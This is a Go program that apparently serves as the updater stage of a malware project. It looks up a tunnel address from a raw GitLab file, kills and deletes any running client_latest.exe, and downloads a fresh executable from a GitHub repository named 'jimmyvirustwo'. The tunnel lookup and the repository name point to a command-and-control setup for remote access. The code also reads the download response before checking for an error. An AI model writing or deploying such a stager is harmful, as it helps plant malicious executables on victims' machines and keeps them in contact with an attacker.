package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"strconv"
	"strings"

	"github.com/biter777/processex"
)

type updateReader struct {
	source      io.Reader
	total       int64
	bytesRead   int64
	lastPercent int
}

func (r *updateReader) Read(p []byte) (int, error) {
	n, err := r.source.Read(p)
	r.bytesRead += int64(n)

	if r.total > 0 {
		currentPct := int((r.bytesRead * 100) / r.total)
		currentChunk := (currentPct / 5) * 5
		if currentChunk > r.lastPercent {
			r.lastPercent = currentChunk
			fmt.Printf("Download progress: %d%%\n", currentChunk)
		}
	}
	return n, err
}
func fetchTunnelURL() string {
	resp, err := http.Get("https://gitlab.com/Plexisity1/tunnel-url/-/raw/main/tunnel-url.txt")
	if err != nil {
		fmt.Println("Error fetching gist:", err)
		return ""
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading gist:", err)
		return ""
	}

	return strings.TrimSpace(string(body))
}

func getUpdate() string {
	binName := "client_latest.exe"

	procs, _, err := processex.FindByName(binName)
	if err != nil && err != processex.ErrNotFound {

		fmt.Println("Error checking for process:", err)
	}
	if err == nil && len(procs) > 0 {

		for _, p := range procs {
			fmt.Println("Killing process with PID:", p.Pid)
			p.Kill()
		}
	}

	// If it doesn't exist locally, download it automatically
	if _, err := os.Stat(binName); os.IsNotExist(err) {
		fmt.Printf("Client binary not present locally. Downloading...\n")
	} else {
		fmt.Println("Client binary already exists. Deleting...")
		err := os.Remove(binName)
		if err != nil {
			panic(fmt.Sprintf("Failed to delete existing binary: %v", err))
		}
	}
	fmt.Printf("Downloading client...")

	url := "https://github.com/Plexisity/jimmyvirustwo/raw/refs/heads/main/compilatons/client_latest.exe"
	resp, err := http.Get(url)
	// show status in chunks of 5% increments
	contentLength := resp.Header.Get("Content-Length")
	contentLengthInt, err := strconv.Atoi(contentLength)
	if contentLength == "" {
		panic("Failed to get content length")
	}

	if err != nil {
		panic(fmt.Sprintf("Failed to download client: %v", err))
	}
	defer resp.Body.Close()

	out, err := os.Create(binName)
	if err != nil {
		panic(fmt.Sprintf("Failed to create binary file: %v", err))
	}
	defer out.Close()

	pr := &updateReader{
		source:      resp.Body,
		total:       int64(contentLengthInt),
		bytesRead:   0,
		lastPercent: 0,
	}

	_, err = io.Copy(out, pr)
	if err != nil {
		panic(fmt.Sprintf("Failed to save binary: %v", err))
	}

	fmt.Println("Client downloaded successfully.")

	return binName
}

func main() {
	fmt.Println("Ensuring client is available...")
	fmt.Println("Finding tunnel URL...")
	tunnelURL := fetchTunnelURL()
	fmt.Println("Tunnel URL:", tunnelURL)
	binPath := getUpdate()
	fmt.Println("Client binary path:", binPath)
}
